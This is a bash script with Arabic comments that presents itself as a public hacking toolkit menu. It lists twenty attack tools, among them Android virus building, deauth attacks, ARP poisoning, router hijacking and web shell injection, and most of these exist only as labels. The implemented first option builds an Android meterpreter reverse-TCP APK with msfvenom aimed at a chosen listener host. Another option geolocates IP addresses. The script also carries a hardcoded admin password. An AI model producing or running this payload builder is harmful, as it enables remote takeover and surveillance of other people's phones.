#!/bin/bash
# xxszmsx FRAMEWORK v3.5 | BY: STUDIO
# [!] الميزة: الأداة عامة للجميع | لوحة التحكم للأدمن فقط
RED='\e[1;31m'; GREEN='\e[1;32m'; NC='\e[0m'

# --- [ لوحة تحكم الأدمن (محمية بكلمة سر) ] ---
function admin_editor() {
    clear
    echo -e "${RED}-----------------------------------------------------"
    echo -e "[!] ADMIN LOGIN REQUIRED"
    echo -e "-----------------------------------------------------${NC}"
    read -s -p "[?] Enter Password: " admin_pass
    echo ""
    
    if [ "$admin_pass" == "mazen2014" ]; then
        echo -e "${GREEN}[+] Access Granted! Welcome Master Mazen.${NC}"
        sleep 1
        clear
        echo -e "${RED}--- STUDIO ADMIN CONTROL PANEL ---${NC}"
        echo "1) Edit xxszmsx.sh (Main Code)"
        echo "2) Add/Create New Script"
        echo "3) List Hidden Files"
        echo "4) Back to Main Menu"
        read -p "Admin Select >> " ed_choice
        
        case $ed_choice in
            1) nano xxszmsx.sh ;;
            2) read -p "File Name: " nf; nano $nf ;;
            3) ls -la; read -p "Press Enter..." ;;
            *) return ;;
        esac
    else
        echo -e "${RED}[X] Wrong Password! Access Denied.${NC}"
        sleep 2
    fi
}

# --- [ التثبيت التلقائي للاختصار ] ---
if [[ $EUID -eq 0 ]] && [ ! -f "/usr/local/bin/studio" ]; then
    ln -sf "$(pwd)/xxszmsx.sh" /usr/local/bin/studio
    chmod +x /usr/local/bin/studio
fi

# --- [ القائمة الرئيسية (تفتح للجميع مباشرة) ] ---
while true; do
    clear
    echo -e "${RED}"
    echo "██╗  ██╗██╗  ██╗███████╗███████╗███    ███╗██╗  ██╗"
    echo "╚██╗██╔╝╚██╗██╔╝██╔════╝██╔════╝████  ████║╚██╗██╔╝"
    echo " ╚███╔╝  ╚███╔╝ ███████╗███████╗██╔████╔██║ ╚███╔╝ "
    echo " ██╔██╗  ██╔██╗ ╚════██║╚════██║██║╚██╔╝██║ ██╔██╗ "
    echo "██╔╝ ██╗██╔╝ ██╗███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
    echo -e "╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
    echo "-----------------------------------------------------"
    echo "   [!] 20 PRO TOOLS | BY: STUDIO | STATUS: PUBLIC    "
    echo "-----------------------------------------------------"
    echo -e "1) Android Virus Build     11) [!] ADMIN PANEL [!]"
    echo "2) Precise IP Tracker      12) Spoof Fake Call"
    echo "3) WiFi Monitor Mode       13) Phone OSINT"
    echo "4) Deauth Attack           14) DNS Spoofing"
    echo "5) MAC Randomizer          15) Social Search"
    echo "6) Port Scanner            16) Web Shell Inject"
    echo "7) Arp Poisoning           17) Email Leak Scan"
    echo "8) Router Hijack           18) Brute Force Pass"
    echo "9) Packet Injector         19) Hash Decryptor"
    echo "10) Bettercap UI           20) UPDATE TOOL"
    echo "-----------------------------------------------------"
    echo "0) Exit"
    read -p "xxszmsx >> " choice

    case $choice in
        1) read -p "LHOST: " lh; read -p "LPORT: " lp; msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > mazen.apk ;;
        2) read -p "IP: " tip; curl -s "http://ip-api.com/json/$tip?fields=status,country,regionName,city,zip,lat,lon,isp,query" ;;
        11) admin_editor ;; # يطلب كلمة السر هنا فقط
        12) echo -e "${RED}[!] Calling Simulation Started...${NC}"; sleep 1 ;;
        20) git pull origin main; echo -e "${GREEN}[+] Updated!${NC}"; sleep 1 ;;
        0) exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"
    read
done
